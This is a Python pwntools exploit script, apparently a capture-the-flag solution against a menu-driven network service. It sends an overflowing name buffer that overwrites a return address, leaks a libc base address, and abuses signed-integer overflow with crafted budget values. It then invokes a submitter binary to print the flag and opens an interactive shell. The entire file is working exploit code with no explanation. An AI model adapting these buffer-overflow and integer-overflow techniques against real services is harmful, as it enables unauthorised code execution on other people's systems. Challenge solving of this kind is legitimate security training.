#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

name = b"A" * 0x30 + b"B" * 8 + p64(0x4015ea)
p.sendlineafter(b"name: ", name)
p.sendlineafter(b"Choice: ", b"D")
p.sendlineafter(b"Choice: ", b"H")
p.sendlineafter(b"name: ", b"asdf")
p.sendlineafter(b"Choice: ", b"X")
p.sendlineafter(b"Choice: ", b"A")
p.sendlineafter(b"Choice: ", b"C")
p.sendlineafter(b"name: ", b"qwer")
p.sendlineafter(b"budget: ", b"10")
p.sendlineafter(b"Region: ", b"10")
p.sendlineafter(b"Choice: ", b"4")
p.sendlineafter(b"ID: ", b"1")
p.sendlineafter(b"1: ", b"1")
p.sendlineafter(b"2: ", b"1")
p.sendlineafter(b"3: ", b"1")
p.sendlineafter(b"4: ", b"1")
p.sendlineafter(b"5: ", b"1")
p.sendlineafter(b"Choice: ", b"E")
p.recvuntil(b"Product: ")
lb = u64(p.recvn(6) + b"\x00\x00") - 0x244fa7
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b"): ", b"-2147483647")
p.sendlineafter(b"(y/n): ", b"n")
p.sendlineafter(b"(y/n): ", b"n")
p.sendlineafter(b"Choice: ", b"E")
p.sendlineafter(b"): ", b"1")
p.sendlineafter(b"): ", b"2147000000")
p.sendlineafter(b"(y/n): ", b"n")
p.sendlineafter(b"(y/n): ", b"y")
p.sendlineafter(b"ID: ", b"0")
p.sendlineafter(b"Choice: ", b"X")
print(f"{hex(lb) = }")
p.sendlineafter(b"Choice: ", b"N")
p.sendlineafter(b"Marketing!\n", b"./submitter")
p.recvuntil(b"Flag: ")
print(b"flag: " + p.recvline())

p.interactive()
